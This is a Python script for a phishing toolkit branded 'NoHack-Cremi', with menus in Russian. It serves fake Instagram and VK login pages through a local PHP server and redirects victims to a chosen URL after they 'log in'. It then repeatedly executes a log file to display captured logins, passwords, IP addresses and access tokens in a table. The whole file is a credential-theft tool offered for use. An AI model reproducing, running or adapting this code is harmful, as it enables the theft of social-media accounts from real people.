import os, sys, time
from multiprocessing import Process
from time import sleep
from prettytable import PrettyTable
os.system('clear')
о = open('log.log', 'w')
о.close()
class A:
    def __call__(self, count=10, sleep_time=0.5):
        if used == "1":
            os.system("cd instagram && php -S localhost:"+str(ports))
        elif used == "2":
            os.system("cd vk && php -S localhost:"+str(ports))
        else:
            print("No number '"+used+"'")



class B:
    def __call__(self, count=10, sleep_time=0.5):
        while True:
            import os
            x = PrettyTable()
            x.field_names = ['Ceть', 'Логин', 'Пароль', 'Верно?', 'IP']
            g=0
            exec(open('log.log').read())
            print(x)
            time.sleep(1)
            os.system("clear")


print("""
              /|
             / |
            /  |
           /   |
          /    ¿
         /()     ><>
        /
  \033[31m_   _       _   _            _          ____                    _\033[0m
 \033[31m| \ | | ___ | | | | __ _  ___| | __     / ___|_ __ ___ _ __ ___ (_)\033[0m
\033[33m |  \| |/ _ \| |_| |/ _` |/ __| |/ /____| |   | ‘__/ _ \ ‘_ ` _ \| |\033[0m
 \033[33m| |\  | (_) |  _  | (_| | (__|   <_____| |___| | |  __/ | | | | | |\033[0m
\033[31m |_| \_|\___/|_| |_|\__,_|\___|_|\_\     \____|_|  \___|_| |_| |_|_|\033[32m Cremi Version 1\033[0m
   \033[44m                        .::NoHack-Cremi::.                  \033[0m
\033[44m                       | Instagram: @nohack_cremi |                 \033[0m
""")
print("""
[1] Сайт Cremi
[2] Соц. Мастер(Сайты для фишинга)
[3] Выйти
""")
used = input("[Введите номер]: ")
if used == "0":
    try:
        x = PrettyTable()
        x.field_names = ['Ceть', 'Логин', 'Пароль', 'Верно?', 'IP', 'access_token']
        exec(open('data.log').read())
        print(x)
        exit()
    except:
        exit()
elif used == "2":
    os.system("python3 social.py")
    exit()
elif used == '3':
    os.system('clear')
    print("""
  \033[31m_   _       _   _            _          ____                    _\033[0m
 \033[31m| \ | | ___ | | | | __ _  ___| | __     / ___|_ __ ___ _ __ ___ (_)\033[0m
\033[33m |  \| |/ _ \| |_| |/ _` |/ __| |/ /____| |   | ‘__/ _ \ ‘_ ` _ \| |\033[0m
 \033[33m| |\  | (_) |  _  | (_| | (__|   <_____| |___| | |  __/ | | | | | |\033[0m
\033[31m |_| \_|\___/|_| |_|\__,_|\___|_|\_\     \____|_|  \___|_| |_| |_|_|\033[32m Cremi Version\033[0m
\033[44m                        .::NoHack-Cremi::.                  \033[0m
\033[44m                       | Instagram: @nohack_cremi |                 \033[0m
>>> Bye!
    """)
    exit()
print("Загрузка...")
ports = input("[Порт(желательно 8080)]: ")
reloc = input("[Ссылка на которую переведёт при авторизации]: ")
if reloc != "":
    if used == "instagram":
        f = open("instagram/location.location", 'w')
        f.write(reloc)
        f.close()
    elif used == "1":
        f = open("vk/location.location", 'w')
        f.write(reloc)
        f.close()
    else:
        pass
else:
    if used ==  "instagram":
        f = open("instagram/location.location", 'w')
        f.write("https://instagram.com")
        f.close()
    elif used == "1":
        f = open("vk/location.location", 'w')
        f.write("https://vk.com")
        f.close()
    else:
        f = open("vk/location.location", 'w')
        f.write("https://google.com")
        f.close()
        f = open("instagram/location.location", 'w')
        f.write("https://google.com")
        f.close()
if ports == "":
    ports=8080
if __name__ == '__main__':
    a = A()
    b = B()

    p1 = Process(target=a, kwargs={'sleep_time': 0.7})
    p2 = Process(target=b, args=(12,))
    p1.start()
    p2.start()

    p1.join()
    p2.join()
